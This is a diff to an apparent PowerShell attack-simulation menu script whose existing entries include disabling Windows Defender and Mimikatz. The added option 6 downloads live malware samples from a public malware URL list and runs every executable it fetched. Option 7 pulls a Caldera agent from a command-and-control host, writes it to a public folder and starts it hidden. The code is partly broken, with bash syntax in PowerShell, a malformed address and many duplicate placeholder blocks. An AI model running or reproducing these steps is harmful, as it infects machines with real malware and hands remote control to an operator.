@@ -10,7 +10,15 @@ Write-Host @"
 |    3) Disable Windows Defender All (T1562.001).        | 
 |    4) Mimikatz.                                        |
 |    5) Screen Capture (T1113).                          |
-|    6) EXIT                                             |
+|    6) 0-Day Malware Samples.                           |
+|    7) Caldera.                                         |
+
+
+
+
+
+
+|    100) EXIT                                           |
 +========================================================+
 
 "@
@@ -97,6 +105,117 @@ DisplayMenu
 }
 6 {
 #OPTION6
+mkdir c:\temp
+cd c:\temp
+Invoke-WebRequest -Uri https://github.com/andrefernandes86/tools-malware-samples-win/raw/main/wget.exe
+Invoke-WebRequest -Uri https://github.com/andrefernandes86/tools-malware-samples-win/raw/main/curl.exe
+curl http://vxvault.net/URL_List.php > urls.txt
+wget -i urls.txt --tries=1 --timeout=5
+for i in *.exe; do start "$i"; done
+del *.* /y
+DisplayMenu
+}
+7 {
+#OPTION7
+$server="http://192.168.1.8080";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like "C:\Users\Public\ncc1701.exe"} | stop-process -f;
+rm -force "C:\Users\Public\ncc1701.exe" -ea ignore;
+[io.file]::WriteAllBytes("C:\Users\Public\ncc1701.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\ncc1701.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+DisplayMenu
+}
+8 {
+#OPTION8
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+6 {
+#OPTION6
+xxxxxxxxxx
+DisplayMenu
+}
+
+
+100 {
+#OPTION100
 Write-Host "Bye"
 Break
 }
